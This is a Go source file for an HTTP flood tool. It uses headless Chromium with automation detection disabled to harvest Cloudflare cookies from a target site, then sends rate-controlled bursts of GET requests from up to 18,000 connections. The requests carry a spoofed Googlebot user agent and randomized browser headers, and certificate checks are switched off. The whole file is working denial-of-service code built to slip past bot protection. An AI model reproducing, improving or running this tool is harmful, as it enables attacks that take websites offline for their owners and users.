package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
	"github.com/valyala/fasthttp"
)

type statsType struct {
	total   int64
	success int64
	failed  int64
}

var stats statsType

const (
	maxConnsPerHost     = 18000
	maxIdleConnDuration = 30 * time.Second
	readTimeout         = 10 * time.Second
	writeTimeout        = 10 * time.Second
)

var userAgents = []string{
	// Google Bot
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
}

var acceptLanguages = []string{
	"hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
	"hi-IN,hi;q=0.9,en;q=0.8",
	"en-IN,en;q=0.9,hi;q=0.8",
	"en-IN,en;q=0.9",
}

var secFetchSites = []string{"none", "same-origin", "same-site", "cross-site"}
var cacheControls = []string{"max-age=0", "no-cache", "no-store"}
var connections = []string{"keep-alive", "close"}

func getCFCookie(target string) string {
	fmt.Println("[CF] Launching chromium to get cookies...")

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.ExecPath("/repl/tools/bin/chromium"),
		chromedp.Flag("headless", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-setuid-sandbox", true),
		chromedp.Flag("disable-blink-features", "AutomationControlled"),
		chromedp.UserAgent(userAgents[rand.Intn(len(userAgents))]),
	)

	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var cookieStr string

	err := chromedp.Run(ctx,
		network.Enable(),
		chromedp.Navigate(target),
		chromedp.Sleep(5*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err := network.GetCookies().Do(ctx)
			if err != nil {
				return err
			}
			parts := []string{}
			for _, c := range cookies {
				parts = append(parts, c.Name+"="+c.Value)
			}
			cookieStr = strings.Join(parts, "; ")
			return nil
		}),
	)

	if err != nil {
		fmt.Println("[CF] Failed:", err)
		return ""
	}

	fmt.Println("[CF] Got cookie:", cookieStr)
	return cookieStr
}

func buildClient() *fasthttp.Client {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS13,
		MaxVersion:         tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
		},
	}

	return &fasthttp.Client{
		TLSConfig:           tlsConfig,
		MaxConnsPerHost:     maxConnsPerHost,
		MaxIdleConnDuration: maxIdleConnDuration,
		ReadTimeout:         readTimeout,
		WriteTimeout:        writeTimeout,
	}
}

func setHeaders(req *fasthttp.Request, cookie string) {
	ua := userAgents[rand.Intn(len(userAgents))]
	lang := acceptLanguages[rand.Intn(len(acceptLanguages))]

	req.Header.SetMethod("GET")
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", lang)
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Connection", connections[rand.Intn(len(connections))])
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("DNT", "1")
	req.Header.Set("Pragma", "no-cache")

	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
}

func makeRequest(client *fasthttp.Client, target string, cookie string) bool {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(target)
	setHeaders(req, cookie)

	err := client.DoTimeout(req, resp, 10*time.Second)
	if err != nil {
		return false
	}

	return resp.StatusCode() >= 200 && resp.StatusCode() < 500
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Missing arguments! Usage: tls <url> <duration_seconds> <rate_per_second> [cookie]")
		fmt.Println("Example: tls https://meji.cc.cd 10 100")
		os.Exit(1)
	}

	target := os.Args[1]

	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Println("Duration's gotta be a positive number (in seconds)")
		os.Exit(1)
	}

	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Println("Rate's gotta be a positive number (req/s)")
		os.Exit(1)
	}

	// cookie dari arg atau auto ambil dari chromium
	cookie := ""
	if len(os.Args) >= 5 && os.Args[4] != "" {
		cookie = os.Args[4]
	} else {
		cookie = getCFCookie(target)
	}

	client := buildClient()

	interval := time.Second / time.Duration(rate)
	ticker := time.NewTicker(interval)
	deadline := time.After(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup

	fmt.Printf("Sent requests to %s\n", target)
	fmt.Printf("Time: %ds | Rate: %d req/s\n\n", duration, rate)

	start := time.Now()

loop:
	for {
		select {
		case <-deadline:
			break loop
		case <-ticker.C:
			wg.Add(1)
			atomic.AddInt64(&stats.total, 1)
			go func() {
				defer wg.Done()
				if makeRequest(client, target, cookie) {
					atomic.AddInt64(&stats.success, 1)
				} else {
					atomic.AddInt64(&stats.failed, 1)
				}
			}()
		}
	}

	ticker.Stop()
	wg.Wait()
	elapsed := time.Since(start).Seconds()

	fmt.Println("Here's how it went")
	fmt.Printf("Hit target: %s\n", target)
	fmt.Printf("Time taken: %.2fs\n", elapsed)
	fmt.Printf("Requests fired: %d\n", stats.total)
	fmt.Printf("Landed clean: %d\n", stats.success)
	fmt.Printf("Bounced back: %d\n", stats.failed)
	fmt.Printf("Cruising at: %.2f req/s\n", float64(stats.total)/elapsed)
}
